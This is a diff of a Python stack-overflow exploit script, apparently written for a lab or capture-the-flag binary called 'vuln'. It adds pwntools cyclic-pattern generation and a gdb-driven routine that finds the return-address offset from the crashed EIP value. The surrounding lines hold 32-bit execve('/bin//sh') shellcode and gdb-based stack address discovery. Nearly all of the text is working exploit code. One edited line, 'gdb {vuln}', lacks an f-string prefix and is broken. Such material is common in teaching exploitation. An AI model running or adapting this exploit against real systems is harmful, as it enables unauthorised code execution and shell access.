@@ -5,6 +5,8 @@ import re
 import sys
 import pty
 import select
+from pwn import *
+
 
 def stack_middle_address(output):
 
@@ -27,6 +29,45 @@ def stack_middle_address(output):
 
     return middle
 
+def generate_test():
+    return cyclic(1000)
+
+def locate_ra(pattern):
+    gdb_proc = subprocess.Popen([f"gdb vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
+    commands = f"""
+    set pagination off  #disabling pagination for uninterrupted output
+    r
+    {pattern.decode('latin-1')}
+    """
+
+    gdb_proc.stdin.write(commands)
+    gdb_proc.stdin.flush()
+
+    while True:
+        output = gdb_proc.stdout.readline()
+        if "Program received signal SIGSEGV" in output:
+            break
+
+    gdb_proc.stdin.write("info registers\n")
+    gdb_proc.stdin.flush()
+
+    gdb_proc.stdin.write("q\n")
+    gdb_proc.stdin.write("y\n")
+    gdb_proc.stdin.flush()
+
+    output, _ = gdb_proc.communicate()
+    
+    eip_value = None
+    for line in output.splitlines():
+        if "eip" in line:  # Find the line with 'eip'
+            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
+            break
+
+    offset = cyclic_find(int(eip_value, 16))
+    return offset
+
+
+
 
 def main():
         
@@ -45,7 +86,7 @@ def main():
     shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
 
     #then call gdb to find in what adresses the stack fluctuates -> info proc mapping
-    gdb_process = subprocess.Popen("gdb vuln", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
+    gdb_process = subprocess.Popen("gdb {vuln}", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
     commands = f"""
     set disable-randomization off
     b {vuln}
